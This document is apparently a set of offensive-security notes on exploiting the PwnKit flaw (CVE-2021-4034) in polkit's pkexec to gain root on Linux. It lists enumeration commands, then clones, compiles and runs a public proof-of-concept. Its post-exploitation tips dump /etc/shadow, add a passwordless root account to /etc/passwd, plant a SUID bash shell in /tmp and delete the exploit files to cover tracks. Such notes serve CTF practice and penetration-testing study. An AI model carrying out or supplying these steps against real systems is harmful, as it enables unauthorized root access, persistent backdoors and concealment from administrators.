### 1. Technique Name:

Polkit â€“ pkexec Local Privilege Escalation (CVE-2021-4034 / PwnKit)
### 2. Summary:

Polkit (formerly PolicyKit) is a system-level service used for fine-grained authorization of privileged operations. The tool `pkexec` allows users to execute commands as another user, typically root, similar to `sudo`.

The vulnerability CVE-2021-4034 (PwnKit) affects the `pkexec` binary and allows a local unprivileged user to escalate privileges to root through memory corruption. This vulnerability existed in all major Linux distributions for over 10 years and can be reliably exploited with a public Proof-of-Concept (PoC).
### 3. Conditions / Requirements:

- `pkexec` binary is present on the system    
- Vulnerable `pkexec` version (unpatched before Jan 2022)
- Local access to the machine (low-privilege user)
- Ability to compile and execute code on the system (via `gcc`)
### 4. Enumeration Steps:
#### A. Check for `pkexec`:

```bash
which pkexec
```
#### B. Check version or distribution info (for patch status):

```bash
pkexec --version     # (if available)
cat /etc/os-release
```
#### C. Verify file permissions:

```bash
ls -l /usr/bin/pkexec
# Should be -rwsr-xr-x (setuid root)
```
#### D. Optional - List known policies or rules (low yield in this case):

```bash
pkaction
ls /usr/share/polkit-1/actions/
```
### 5. Exploitation Steps (CVE-2021-4034):
#### A. Download and compile the PoC:

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```
#### B. Execute the exploit:

```bash
./poc
```
#### C. Verify root shell:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

> If you end up in a minimal shell (`sh`), switch to a proper interactive shell:

```bash
# bash
```
### 6. Post-Exploitation Tips:

- You are now root. You can:    
    - Dump sensitive files (e.g., `/etc/shadow`, `/root/flag.txt`)    
    - Add a new root user:    

```bash
echo 'haxor::0:0:root:/root:/bin/bash' >> /etc/passwd
```

- Drop a SUID shell:

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```

- Clean up the PoC binary:

```bash
rm -rf ~/CVE-2021-4034
```
### 7. Example / Notes:

- Command used to exploit:    

```bash
./poc
```

- Verification:

```bash
# id
uid=0(root) gid=0(root)
```

- PoC Repository:  
    [https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)
   
- About pkexec:  
    You can also manually run:

```bash
pkexec -u root <command>
```

But it will typically prompt for a password unless `pkexec` is misconfigured or vulnerable.
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Pwnkit #Polkit